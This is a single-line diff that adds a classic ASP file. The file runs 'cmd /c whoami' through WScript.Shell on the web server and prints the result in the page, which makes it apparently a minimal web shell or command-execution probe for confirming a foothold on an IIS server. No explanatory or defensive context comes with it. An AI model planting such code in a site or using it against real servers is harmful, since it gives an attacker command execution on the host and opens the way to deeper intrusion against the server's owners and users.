@@ -1,0 +1,1 @@
+<% Response.Write(CreateObject("WScript.Shell").Exec("cmd /c whoami").StdOut.ReadAll()) %>
